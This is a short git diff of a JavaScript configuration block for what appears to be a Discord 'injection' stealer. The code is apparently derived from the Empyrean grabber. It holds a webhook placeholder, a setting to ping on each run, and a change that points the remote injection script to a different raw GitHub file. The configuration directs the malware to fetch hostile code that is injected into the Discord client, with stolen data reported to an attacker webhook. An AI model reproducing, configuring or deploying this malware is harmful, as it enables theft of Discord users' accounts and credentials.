@@ -11,9 +11,9 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/clean.js",
+    injection_url: "https://raw.githubusercontent.com/ardasezerx/w/refs/heads/main/test.js",
     embed_name: "Injection",
-    embed_icon: "https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/images/avatar.png",
+    embed_icon: "https://uxwing.com/wp-content/themes/uxwing/download/animals-and-birds/cat-icon.png",
     embed_color: 0x2b565e,
     embed_desc: "Discord injection",
     ping_on_run: true,
